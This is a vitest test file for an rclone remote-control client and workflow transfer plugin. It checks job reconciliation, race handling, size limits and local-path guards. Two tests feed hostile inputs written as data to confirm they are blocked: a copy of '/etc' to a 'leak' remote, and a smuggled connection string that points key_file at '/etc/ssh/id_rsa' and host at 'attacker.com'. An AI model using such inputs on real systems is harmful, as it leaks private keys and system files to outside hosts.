// SPDX-License-Identifier: Apache-2.0

import http from 'node:http';
import type { AddressInfo } from 'node:net';
import {
  EXECUTION_STATUS,
  JOB_STATUS,
  type FlowNodeModel,
  type JobModel,
  type Processor,
} from '@nocobase/plugin-workflow';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { PLUGIN_NAME } from '../../shared/constants';
import { RcloneRcClient } from '../services/rclone-rc-client';
import { RcloneJobReconciler } from '../workflow/RcloneJobReconciler';
import { RcloneTransferInstruction } from '../workflow/RcloneTransferInstruction';

const activeServers: http.Server[] = [];

async function startMockRcd(
  handler: (req: http.IncomingMessage, body: Record<string, unknown>, res: http.ServerResponse) => void,
): Promise<string> {
  const server = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (chunk: Buffer) => chunks.push(chunk));
    req.on('end', () => {
      let parsed: Record<string, unknown> = {};
      const raw = Buffer.concat(chunks).toString('utf8');
      if (raw) {
        try {
          parsed = JSON.parse(raw) as Record<string, unknown>;
        } catch {
          parsed = {};
        }
      }
      handler(req, parsed, res);
    });
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  activeServers.push(server);
  const { port } = server.address() as AddressInfo;
  return `http://127.0.0.1:${port}`;
}

afterEach(async () => {
  while (activeServers.length > 0) {
    const srv = activeServers.pop();
    if (srv) {
      await new Promise<void>((resolve) => srv.close(() => resolve()));
    }
  }
});

describe('RcloneRcClient & Workflow Transfer Reconciler', () => {
  it('communicates with rclone rcd, redacts credentials on failure, and streams --rc-serve files', async () => {
    const baseUrl = await startMockRcd((req, body, res) => {
      if (req.headers.authorization !== `Basic ${Buffer.from('rcadmin:secret123').toString('base64')}`) {
        res.writeHead(401, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Unauthorized for secret123' }));
        return;
      }
      if (req.url === '/rc/noopauth') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{}');
        return;
      }
      if (req.url === '/core/version') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ version: 'v1.68.2', os: 'linux', arch: 'amd64' }));
        return;
      }
      if (req.url === '/job/status' && body.jobid === 99) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ id: 99, finished: true, success: false, error: 'source directory missing' }));
        return;
      }
      if (req.method === 'GET' && req.url?.startsWith('/[s3%3Abucket]/hello.txt')) {
        res.writeHead(200, { 'Content-Type': 'text/plain', 'Content-Length': '11' });
        res.end('hello world');
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const badClient = new RcloneRcClient({
      baseUrl,
      authType: 'basic',
      username: 'rcadmin',
      password: 'wrong-secret123',
    });
    await expect(badClient.testConnection()).rejects.not.toThrow(/wrong-secret123/);

    const client = new RcloneRcClient({
      baseUrl,
      authType: 'basic',
      username: 'rcadmin',
      password: 'secret123',
    });

    const ver = await client.testConnection();
    expect(ver.version).toBe('v1.68.2');

    const failedStatus = await client.getJobStatus(99);
    expect(failedStatus).toMatchObject({ id: 99, finished: true, success: false, error: 'source directory missing' });

    const streamHandle = await client.openDownloadStream('s3:bucket', 'hello.txt', false);
    const chunks: Buffer[] = [];
    for await (const chunk of streamHandle.stream) {
      chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk as Uint8Array));
    }
    expect(Buffer.concat(chunks).toString('utf8')).toBe('hello world');
    await streamHandle.cleanup();
  });

  it('blocks unauthorized local paths in Workflow and reconciles async jobs to workflow.resume()', async () => {
    let jobFinished = false;
    const dispatchedPayloads: Array<{ url: string; body: Record<string, unknown> }> = [];

    const baseUrl = await startMockRcd((req, body, res) => {
      res.setHeader('Content-Type', 'application/json');
      if (req.url === '/config/listremotes') {
        res.end(JSON.stringify({ remotes: ['s3-src', 'gdrive-dst'] }));
        return;
      }
      if (req.url === '/config/dump') {
        res.end(JSON.stringify({ 's3-src': { type: 's3' }, 'gdrive-dst': { type: 'drive' } }));
        return;
      }
      if (req.url === '/sync/copy') {
        dispatchedPayloads.push({ url: req.url, body });
        res.end(JSON.stringify({ jobid: 77 }));
        return;
      }
      if (req.url === '/core/stats') {
        res.end(JSON.stringify({ bytes: jobFinished ? 2048 : 1024, totalBytes: 2048, speed: 512, eta: 2 }));
        return;
      }
      if (req.url === '/job/status') {
        res.end(
          JSON.stringify({
            id: 77,
            finished: jobFinished,
            success: true,
            duration: 4.2,
          }),
        );
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const client = new RcloneRcClient({ baseUrl, authType: 'none' });

    // In-memory mock task store + workflow job store
    const taskState: Record<string, unknown> = {
      id: 10,
      connectionId: 1,
      operation: 'sync/copy',
      srcFs: 's3-src:invoices',
      srcRemote: '2026',
      dstFs: 'gdrive-dst:backup',
      dstRemote: '2026',
      dryRun: true,
      localAuthorized: false,
      status: 'queued',
    };

    const taskModel = {
      get: (k: string) => taskState[k],
      update: vi.fn(async (patch: Record<string, unknown>) => {
        Object.assign(taskState, patch);
      }),
    };

    const wfJobState: Record<string, unknown> = {
      id: '9001',
      status: JOB_STATUS.PENDING,
      result: null,
      execution: { id: 501, workflowId: 301, status: EXECUTION_STATUS.STARTED },
    };
    const wfJobModel = {
      get id() {
        return wfJobState.id;
      },
      get status() {
        return wfJobState.status;
      },
      get result() {
        return wfJobState.result;
      },
      get execution() {
        return wfJobState.execution;
      },
      set: (patch: Record<string, unknown>) => Object.assign(wfJobState, patch),
      save: vi.fn().mockResolvedValue(undefined),
      getExecution: vi.fn(async () => wfJobState.execution),
    } as unknown as JobModel;

    const resumeSpy = vi.fn().mockResolvedValue(undefined);
    const kickSpy = vi.fn();

    const mockApp = {
      db: {
        getCollection: vi.fn((name: string) =>
          name === 'jobs' ? { model: { findAll: vi.fn().mockResolvedValue([wfJobModel]) } } : { model: {} },
        ),
        getRepository: vi.fn((name: string) => {
          if (name === 'rcloneTransferTasks') {
            return {
              findOne: vi.fn(async () => taskModel),
              find: vi.fn(async () => (taskState.status === 'running' ? [taskModel] : [])),
              create: vi.fn(),
            };
          }
          if (name === 'jobs') {
            return { findOne: vi.fn(async () => wfJobModel) };
          }
          return {};
        }),
      },
      pm: {
        get: vi.fn((name: string) => {
          if (name === 'workflow') return { app: mockApp, resume: resumeSpy };
          if (name === PLUGIN_NAME) {
            return {
              connectionManager: { getClient: vi.fn(async () => ({ model: {}, client })) },
              reconciler: { kick: kickSpy },
            };
          }
          return undefined;
        }),
      },
    };

    const workflowPlugin = { app: mockApp, resume: resumeSpy };
    const instruction = new RcloneTransferInstruction(workflowPlugin as never);

    // 1. Verify privilege escalation guard blocks unauthorized local path in standalone workflow node
    const blockedNode = {
      id: 1,
      key: 'node_local',
      config: {
        connectionId: 1,
        operation: 'sync/copy',
        srcFs: '/etc',
        dstFs: 'gdrive-dst:leak',
        allowLocalPaths: false,
        failOnError: true,
      },
    } as unknown as FlowNodeModel;

    const processor = {
      execution: { id: 501, workflowId: 301 },
      getParsedValue: (v: unknown) => v,
      saveJob: vi.fn((payload: Record<string, unknown>) => {
        Object.assign(wfJobState, payload);
        return wfJobModel;
      }),
    } as unknown as Processor;

    const blockedRes = await instruction.run(blockedNode, null as unknown as JobModel, processor);
    expect(blockedRes.status).toBe(JOB_STATUS.FAILED);
    expect(dispatchedPayloads).toHaveLength(0);

    // 2. Run authorized cloud-to-cloud Explorer task -> returns PENDING job immediately
    const explorerNode = {
      id: 2,
      key: 'node_transfer',
      config: { taskId: 10, failOnError: true },
    } as unknown as FlowNodeModel;

    const pendingJob = await instruction.run(explorerNode, null as unknown as JobModel, processor);
    expect(pendingJob.status).toBe(JOB_STATUS.PENDING);
    expect(taskState.status).toBe('running');
    expect(taskState.rcloneJobId).toBe(77);
    expect(dispatchedPayloads[0]?.body).toMatchObject({
      srcFs: 's3-src:invoices/2026',
      dstFs: 'gdrive-dst:backup/2026',
      _async: true,
      _config: { DryRun: true },
    });

    // 3. Reconciler tick #1 while still running -> updates progress to 50%, does NOT resume yet
    const reconciler = new RcloneJobReconciler(
      mockApp as never,
      { getClient: vi.fn(async () => ({ model: {}, client })) } as never,
    );
    reconciler.start();
    await reconciler.reconcileOnce();
    expect(taskState.progress).toBe(50);
    expect(resumeSpy).not.toHaveBeenCalled();

    // 4. Reconciler tick #2 after rclone finishes -> marks task completed & calls workflow.resume(job) with RESOLVED
    jobFinished = true;
    await reconciler.reconcileOnce();
    reconciler.stop();

    expect(taskState.status).toBe('completed');
    expect(taskState.progress).toBe(100);
    expect(wfJobState.status).toBe(JOB_STATUS.RESOLVED);
    expect(wfJobState.result).toMatchObject({
      taskId: 10,
      rcloneJobId: 77,
      success: true,
      bytes: 2048,
      totalBytes: 2048,
    });
    expect(resumeSpy).toHaveBeenCalledTimes(1);
  });

  it('skips stopped tasks in Instruction, deduplicates HA resume via atomic claim, and rejects >4 GiB ZIP downloads', async () => {
    const postSpy = vi.fn();
    const baseUrl = await startMockRcd((req, body, res) => {
      postSpy(req.url, body);
      res.setHeader('Content-Type', 'application/json');
      if (req.url === '/operations/list') {
        res.end(
          JSON.stringify({
            list: [{ Path: 'huge/backup.tar', Name: 'backup.tar', Size: 5 * 1024 * 1024 * 1024, IsDir: false }],
          }),
        );
        return;
      }
      res.end('{}');
    });

    const client = new RcloneRcClient({ baseUrl, authType: 'none' });
    await expect(client.openDownloadStream('s3:bucket', 'huge', true)).rejects.toMatchObject({ status: 413 });

    const stoppedTask = {
      get: (k: string) =>
        ({
          id: 22,
          status: 'stopped',
          errorText: 'Stopped by user',
        })[k],
    };

    const jobsClaimState = { status: JOB_STATUS.PENDING };
    const taskClaimState = { status: 'running' };
    const wfJob = {
      id: '999',
      get status() {
        return jobsClaimState.status;
      },
      result: { taskId: 22, failOnError: true },
      execution: { id: 700, workflowId: 400, status: EXECUTION_STATUS.STARTED },
      set: vi.fn((patch: Record<string, unknown>) => Object.assign(jobsClaimState, patch)),
      save: vi.fn(),
    } as unknown as JobModel;

    const resumeSpy = vi.fn().mockResolvedValue(undefined);
    const taskModelUpdate = vi.fn(async (_vals: Record<string, unknown>, opts: { where: { status: string[] } }) => {
      if (opts.where.status.includes(taskClaimState.status)) {
        taskClaimState.status = 'completed';
        return [1];
      }
      return [0];
    });
    const jobModelUpdate = vi.fn(async (vals: Record<string, unknown>, opts: { where: { status: number } }) => {
      if (jobsClaimState.status === opts.where.status) {
        jobsClaimState.status = vals.status as number;
        return [1];
      }
      return [0];
    });

    const mockApp = {
      db: {
        getCollection: vi.fn((name: string) => {
          if (name === 'rcloneTransferTasks') return { model: { update: taskModelUpdate } };
          if (name === 'jobs') return { model: { update: jobModelUpdate } };
          return { model: {} };
        }),
        getRepository: vi.fn((name: string) => {
          if (name === 'rcloneTransferTasks') return { findOne: vi.fn(async () => stoppedTask) };
          if (name === 'jobs') return { findOne: vi.fn(async () => wfJob) };
          return {};
        }),
      },
      pm: { get: vi.fn() },
    };

    postSpy.mockClear();
    const instruction = new RcloneTransferInstruction({ app: mockApp, resume: resumeSpy } as never);
    const stoppedOutcome = await instruction.run(
      { id: 3, key: 'n3', config: { taskId: 22, failOnError: true } } as unknown as FlowNodeModel,
      null as unknown as JobModel,
      {
        execution: { id: 700, workflowId: 400 },
        getParsedValue: (v: unknown) => v,
        saveJob: vi.fn(),
      } as unknown as Processor,
    );
    expect(stoppedOutcome.status).toBe(JOB_STATUS.FAILED);
    expect(postSpy).not.toHaveBeenCalled();

    const reconciler = new RcloneJobReconciler(mockApp as never, {} as never);
    const runningTask = {
      get: (k: string) => ({ id: 22, workflowJobId: '999', startedAt: new Date().toISOString() })[k],
      set: vi.fn(),
    } as never;

    await Promise.all([
      reconciler.finalizeTaskAndWorkflowJob(
        runningTask,
        new Map([['999', wfJob]]),
        { app: mockApp, resume: resumeSpy } as never,
        { status: 'completed', success: true, bytes: 100, totalBytes: 100, duration: 1 },
      ),
      reconciler.finalizeTaskAndWorkflowJob(
        runningTask,
        new Map([['999', wfJob]]),
        { app: mockApp, resume: resumeSpy } as never,
        { status: 'completed', success: true, bytes: 100, totalBytes: 100, duration: 1 },
      ),
    ]);
    expect(resumeSpy).toHaveBeenCalledTimes(1);
  });

  it('keeps running tasks alive across transient /job/status 502 errors and recovers orphaned PENDING workflow jobs', async () => {
    let statusCalls = 0;
    const baseUrl = await startMockRcd((req, _body, res) => {
      if (req.url === '/job/status') {
        statusCalls += 1;
        if (statusCalls === 1) {
          res.writeHead(502, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Bad Gateway' }));
          return;
        }
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ id: 88, finished: true, success: true, duration: 2.5 }));
        return;
      }
      if (req.url === '/core/stats') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ bytes: 512, totalBytes: 512, speed: 256 }));
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const client = new RcloneRcClient({ baseUrl, authType: 'none' });
    const taskState: Record<string, unknown> = {
      id: 30,
      connectionId: 1,
      rcloneJobId: 88,
      workflowJobId: '7777',
      status: 'running',
      bytes: 0,
      totalBytes: 512,
      startedAt: new Date().toISOString(),
    };
    const taskModel = {
      get: (k: string) => taskState[k],
      update: vi.fn(async (patch: Record<string, unknown>) => {
        Object.assign(taskState, patch);
      }),
    };

    // Simulate Processor.exit() NOT having flushed job '7777' to the DB yet during tick #2, then appearing before tick #3
    let jobFlushedToDb = false;
    const wfJobState: Record<string, unknown> = {
      id: '7777',
      status: JOB_STATUS.PENDING,
      result: { taskId: 30, connectionId: 1, rcloneJobId: 88, failOnError: true },
      execution: { id: 801, workflowId: 401, status: EXECUTION_STATUS.STARTED },
    };
    const wfJobModel = {
      get id() {
        return wfJobState.id;
      },
      get status() {
        return wfJobState.status;
      },
      get result() {
        return wfJobState.result;
      },
      get execution() {
        return wfJobState.execution;
      },
      set: (patch: Record<string, unknown>) => Object.assign(wfJobState, patch),
      save: vi.fn().mockResolvedValue(undefined),
      getExecution: vi.fn(async () => wfJobState.execution),
    } as unknown as JobModel;

    const resumeSpy = vi.fn().mockResolvedValue(undefined);
    const mockApp = {
      logger: { warn: vi.fn() },
      db: {
        getCollection: vi.fn((name: string) =>
          name === 'jobs'
            ? { model: { findAll: vi.fn(async () => (jobFlushedToDb ? [wfJobModel] : [])) } }
            : { model: {} },
        ),
        getRepository: vi.fn((name: string) => {
          if (name === 'rcloneTransferTasks') {
            return {
              find: vi.fn(async () => (taskState.status === 'running' ? [taskModel] : [])),
              findOne: vi.fn(async () => taskModel),
            };
          }
          if (name === 'jobs') {
            return { findOne: vi.fn(async () => (jobFlushedToDb ? wfJobModel : null)) };
          }
          return {};
        }),
      },
      pm: {
        get: vi.fn((name: string) => (name === 'workflow' ? { app: mockApp, resume: resumeSpy } : undefined)),
      },
    };

    const reconciler = new RcloneJobReconciler(
      mockApp as never,
      { getClient: vi.fn(async () => ({ model: {}, client })) } as never,
    );
    reconciler.start();

    // Tick 1: transient 502 error on /job/status -> task must remain running, not failed
    await reconciler.reconcileOnce();
    expect(taskState.status).toBe('running');
    expect(resumeSpy).not.toHaveBeenCalled();

    // Tick 2: job finishes before Processor.exit() inserts wfJob -> task completes, wfJob not resumed yet
    await reconciler.reconcileOnce();
    expect(taskState.status).toBe('completed');
    expect(resumeSpy).not.toHaveBeenCalled();

    // Tick 3: Processor.exit() has now flushed wfJob '7777' as PENDING while runningTasks is empty -> orphan recovery resumes it
    jobFlushedToDb = true;
    await reconciler.reconcileOnce();
    reconciler.stop();

    expect(wfJobState.status).toBe(JOB_STATUS.RESOLVED);
    expect(wfJobState.result).toMatchObject({ taskId: 30, success: true, bytes: 512, totalBytes: 512 });
    expect(resumeSpy).toHaveBeenCalledTimes(1);
  });

  it('blocks parameter-override connection strings in RcloneTransferInstruction when allowLocalPaths is false', async () => {
    const postAsyncSpy = vi.fn();
    const mockApp = {
      db: { getRepository: vi.fn() },
      pm: {
        get: vi.fn((name: string) =>
          name === PLUGIN_NAME
            ? {
                connectionManager: {
                  getClient: vi.fn(async () => ({
                    model: {},
                    client: {
                      isFsLocal: vi.fn(async () => false),
                      postAsync: postAsyncSpy,
                    },
                  })),
                },
                reconciler: { kick: vi.fn() },
              }
            : undefined,
        ),
      },
    };

    const instruction = new RcloneTransferInstruction({ app: mockApp, resume: vi.fn() } as never);
    const outcome = await instruction.run(
      {
        id: 9,
        key: 'node_override',
        config: {
          connectionId: 1,
          operation: 'sync/copy',
          srcFs: 'corp-sftp,key_file=/etc/ssh/id_rsa,host=attacker.com:',
          dstFs: 'gdrive:exfil',
          allowLocalPaths: false,
          failOnError: true,
        },
      } as unknown as FlowNodeModel,
      null as unknown as JobModel,
      {
        execution: { id: 901, workflowId: 501 },
        getParsedValue: (v: unknown) => v,
        saveJob: vi.fn(),
      } as unknown as Processor,
    );

    expect(outcome.status).toBe(JOB_STATUS.FAILED);
    expect(String((outcome.result as { error?: string }).error)).toMatch(/connection strings and parameter overrides/i);
    expect(postAsyncSpy).not.toHaveBeenCalled();
  });

  it('reconciles connections concurrently, backfills missing rcloneJobId from orphan wfJob, and fails corrupted tasks', async () => {
    const healthyUrl = await startMockRcd((req, _body, res) => {
      res.setHeader('Content-Type', 'application/json');
      if (req.url === '/job/status') {
        res.end(JSON.stringify({ id: 55, finished: true, success: true, duration: 1.5 }));
        return;
      }
      if (req.url === '/core/stats') {
        res.end(JSON.stringify({ bytes: 100, totalBytes: 100, speed: 100 }));
        return;
      }
      res.writeHead(404);
      res.end();
    });
    const healthyClient = new RcloneRcClient({ baseUrl: healthyUrl, authType: 'none' });

    // Task A: on healthy connection 1 -> finishes even while connection 2 fails getClient
    const taskAState: Record<string, unknown> = {
      id: 101,
      connectionId: 1,
      rcloneJobId: 55,
      workflowJobId: 'wf-101',
      status: 'running',
      startedAt: new Date().toISOString(),
    };
    // Task B: on failing connection 2 -> stays running without blocking connection 1
    const taskBState: Record<string, unknown> = {
      id: 102,
      connectionId: 2,
      rcloneJobId: 66,
      workflowJobId: 'wf-102',
      status: 'running',
      startedAt: new Date().toISOString(),
    };
    // Task C: missing rcloneJobId on task row, but orphan wfJob has rcloneJobId=55 -> backfilled
    const taskCState: Record<string, unknown> = {
      id: 103,
      connectionId: 1,
      rcloneJobId: null,
      workflowJobId: 'wf-103',
      status: 'running',
      startedAt: new Date().toISOString(),
    };
    // Task D: missing rcloneJobId on BOTH task row and orphan wfJob -> finalized as failed (no infinite loop)
    const taskDState: Record<string, unknown> = {
      id: 104,
      connectionId: 1,
      rcloneJobId: null,
      workflowJobId: 'wf-104',
      status: 'running',
      startedAt: new Date().toISOString(),
    };

    const makeTaskModel = (state: Record<string, unknown>) => ({
      get: (k: string) => state[k],
      update: vi.fn(async (patch: Record<string, unknown>) => {
        Object.assign(state, patch);
      }),
    });
    const taskModels: Record<number, ReturnType<typeof makeTaskModel>> = {
      101: makeTaskModel(taskAState),
      102: makeTaskModel(taskBState),
      103: makeTaskModel(taskCState),
      104: makeTaskModel(taskDState),
    };

    const makeWfJob = (id: string, result: Record<string, unknown>) => {
      const state: Record<string, unknown> = {
        id,
        status: JOB_STATUS.PENDING,
        result,
        execution: { id: 900, workflowId: 500, status: EXECUTION_STATUS.STARTED },
      };
      return {
        state,
        model: {
          get id() {
            return state.id;
          },
          get status() {
            return state.status;
          },
          get result() {
            return state.result;
          },
          get execution() {
            return state.execution;
          },
          set: (patch: Record<string, unknown>) => Object.assign(state, patch),
          save: vi.fn().mockResolvedValue(undefined),
          getExecution: vi.fn(async () => state.execution),
        } as unknown as JobModel,
      };
    };

    const wfA = makeWfJob('wf-101', { taskId: 101, rcloneJobId: 55, failOnError: true });
    const wfB = makeWfJob('wf-102', { taskId: 102, rcloneJobId: 66, failOnError: true });
    const wfC = makeWfJob('wf-103', { taskId: 103, rcloneJobId: 55, failOnError: true });
    const wfD = makeWfJob('wf-104', { taskId: 104, failOnError: true });
    const allWfJobs = [wfA, wfB, wfC, wfD];

    const resumeSpy = vi.fn().mockResolvedValue(undefined);
    const mockApp = {
      logger: { warn: vi.fn() },
      db: {
        getCollection: vi.fn((name: string) =>
          name === 'jobs'
            ? {
                model: {
                  findAll: vi.fn(async () =>
                    allWfJobs.filter((j) => j.state.status === JOB_STATUS.PENDING).map((j) => j.model),
                  ),
                },
              }
            : { model: {} },
        ),
        getRepository: vi.fn((name: string) => {
          if (name === 'rcloneTransferTasks') {
            return {
              find: vi.fn(async () => Object.values(taskModels).filter((m) => m.get('status') === 'running')),
              findOne: vi.fn(async ({ filterByTk }: { filterByTk: number }) => taskModels[filterByTk] ?? null),
            };
          }
          if (name === 'jobs') {
            return {
              findOne: vi.fn(async ({ filterByTk }: { filterByTk: string }) => {
                const match = allWfJobs.find((j) => j.state.id === filterByTk);
                return match?.model ?? null;
              }),
            };
          }
          return {};
        }),
      },
      pm: {
        get: vi.fn((name: string) => (name === 'workflow' ? { app: mockApp, resume: resumeSpy } : undefined)),
      },
    };

    const reconciler = new RcloneJobReconciler(
      mockApp as never,
      {
        getClient: vi.fn(async (connId: number) => {
          if (connId === 2) {
            throw new Error('Connection 2 unreachable');
          }
          return { model: {}, client: healthyClient };
        }),
      } as never,
    );

    reconciler.start();
    await reconciler.reconcileOnce();
    reconciler.stop();

    // Task A completed concurrently despite connection 2 failure
    expect(taskAState.status).toBe('completed');
    expect(wfA.state.status).toBe(JOB_STATUS.RESOLVED);
    // Task B on failing connection 2 stayed running (transient failure)
    expect(taskBState.status).toBe('running');
    expect(wfB.state.status).toBe(JOB_STATUS.PENDING);
    // Task C backfilled rcloneJobId=55 from orphan wfJob so next tick can reconcile it
    expect(taskCState.rcloneJobId).toBe(55);
    expect(taskCState.status).toBe('running');
    // Task D had no rcloneJobId anywhere -> finalized as failed instead of spinning forever
    expect(taskDState.status).toBe('failed');
    expect(wfD.state.status).toBe(JOB_STATUS.FAILED);
    expect(resumeSpy).toHaveBeenCalledTimes(2);
  });

  it('detects local wrapper remotes (crypt/combine), rethrows non-404 readRawConfigFile errors, passes createEmptySrcDirs in moveDirSync, and handles task claim races', async () => {
    let configStatus = 404;
    let lastMoveBody: Record<string, unknown> | null = null;
    const baseUrl = await startMockRcd((req, body, res) => {
      res.setHeader('Content-Type', 'application/json');
      if (req.url === '/config/listremotes') {
        res.end(JSON.stringify({ remotes: ['s3-cloud', 'vault-crypt', 'merged-combine'] }));
        return;
      }
      if (req.url === '/config/dump') {
        res.end(
          JSON.stringify({
            's3-cloud': { type: 's3' },
            'vault-crypt': { type: 'crypt', remote: '/var/backups' },
            'merged-combine': { type: 'combine', upstreams: 'cloud=s3-cloud:b local=/mnt/data' },
          }),
        );
        return;
      }
      if (req.url === '/operations/fsinfo') {
        // Rclone crypt/combine report IsLocal=false even when wrapping a host local path
        res.end(JSON.stringify({ Name: 'wrapper', Features: { IsLocal: false } }));
        return;
      }
      if (req.url === '/sync/move') {
        lastMoveBody = body;
        res.end('{}');
        return;
      }
      if (req.url === '/config/paths') {
        res.end(JSON.stringify({ config: '/config/rclone.conf' }));
        return;
      }
      if (req.method === 'GET') {
        res.writeHead(configStatus);
        res.end('fail');
        return;
      }
      if (req.url === '/operations/stat') {
        if (configStatus === 404) {
          res.end(JSON.stringify({ item: null }));
        } else {
          res.writeHead(502);
          res.end(JSON.stringify({ error: 'Upstream timeout' }));
        }
        return;
      }
      res.writeHead(404);
      res.end();
    });

    const client = new RcloneRcClient({ baseUrl, authType: 'none' });

    // 1. crypt/combine remotes backed by local host paths are flagged isLocal=true
    const remotes = await client.inspectRemotes();
    expect(remotes.find((r) => r.name === 's3-cloud')?.isLocal).toBe(false);
    expect(remotes.find((r) => r.name === 'vault-crypt')?.isLocal).toBe(true);
    expect(remotes.find((r) => r.name === 'merged-combine')?.isLocal).toBe(true);
    expect(await client.isFsLocal('vault-crypt:')).toBe(true);
    expect(await client.isFsLocal('merged-combine:local')).toBe(true);
    expect(await client.isFsLocal('s3-cloud:bucket')).toBe(false);

    // 2. moveDirSync includes createEmptySrcDirs: true so empty directories are preserved
    await client.moveDirSync('s3-cloud:b/old', 's3-cloud:b/new');
    expect(lastMoveBody).toMatchObject({ createEmptySrcDirs: true, deleteEmptySrcDirs: true });

    // 3. readRawConfigFile returns empty string on 404, but rethrows non-404 errors (e.g. 502)
    configStatus = 404;
    await expect(client.readRawConfigFile()).resolves.toMatchObject({ content: '', configDisabled: false });
    configStatus = 502;
    await expect(client.readRawConfigFile()).rejects.toMatchObject({ status: 502 });

    // 4. RcloneTransferInstruction skips already-running task and stops rclone job if atomic claim loses race to stopJob
    const postAsyncSpy = vi.fn(async () => ({ jobid: 321 }));
    const stopJobSpy = vi.fn(async () => {});
    const runningTaskModel = {
      get: (k: string) => ({ id: 41, status: 'running' })[k],
    };
    const racedTaskState: Record<string, unknown> = {
      id: 42,
      connectionId: 1,
      operation: 'sync/copy',
      srcFs: 's3-cloud:a',
      srcRemote: '',
      dstFs: 's3-cloud:b',
      dstRemote: '',
      localAuthorized: false,
      status: 'queued',
    };
    const racedTaskModel = {
      get: (k: string) => racedTaskState[k],
      update: vi.fn(),
    };
    const savedJobState: Record<string, unknown> = { id: 'wf-42', status: JOB_STATUS.PENDING, result: {} };
    const savedJobMock = {
      get id() {
        return savedJobState.id;
      },
      get status() {
        return savedJobState.status;
      },
      get result() {
        return savedJobState.result;
      },
      set: (patch: Record<string, unknown>) => Object.assign(savedJobState, patch),
    } as unknown as JobModel;

    let findCount = 0;
    const mockApp = {
      db: {
        getCollection: vi.fn((name: string) =>
          name === 'rcloneTransferTasks'
            ? {
                model: {
                  // Simulate stopJob having changed status to 'stopped' before atomic claim runs
                  update: vi.fn(async () => {
                    racedTaskState.status = 'stopped';
                    racedTaskState.errorText = 'Stopped by user';
                    return [0];
                  }),
                },
              }
            : { model: {} },
        ),
        getRepository: vi.fn(() => ({
          findOne: vi.fn(async ({ filterByTk }: { filterByTk: number }) => {
            if (filterByTk === 41) return runningTaskModel;
            findCount += 1;
            return racedTaskModel;
          }),
        })),
      },
      pm: {
        get: vi.fn((name: string) =>
          name === PLUGIN_NAME
            ? {
                connectionManager: {
                  getClient: vi.fn(async () => ({
                    model: {},
                    client: {
                      isFsLocal: vi.fn(async () => false),
                      postAsync: postAsyncSpy,
                      stopJob: stopJobSpy,
                    },
                  })),
                },
                reconciler: { kick: vi.fn() },
              }
            : undefined,
        ),
      },
    };

    const instruction = new RcloneTransferInstruction({ app: mockApp, resume: vi.fn() } as never);
    const processor = {
      execution: { id: 910, workflowId: 510 },
      getParsedValue: (v: unknown) => v,
      saveJob: vi.fn((payload: Record<string, unknown>) => {
        Object.assign(savedJobState, payload);
        return savedJobMock;
      }),
    } as unknown as Processor;

    const alreadyRunningRes = await instruction.run(
      { id: 1, key: 'n1', config: { taskId: 41, failOnError: true } } as unknown as FlowNodeModel,
      null as unknown as JobModel,
      processor,
    );
    expect(alreadyRunningRes.status).toBe(JOB_STATUS.FAILED);
    expect(postAsyncSpy).not.toHaveBeenCalled();

    const racedRes = await instruction.run(
      { id: 2, key: 'n2', config: { taskId: 42, failOnError: true } } as unknown as FlowNodeModel,
      null as unknown as JobModel,
      processor,
    );
    expect(findCount).toBeGreaterThanOrEqual(2);
    expect(stopJobSpy).toHaveBeenCalledWith(321);
    expect(racedTaskState.status).toBe('stopped');
    expect(racedRes.status).toBe(JOB_STATUS.FAILED);
  });
});
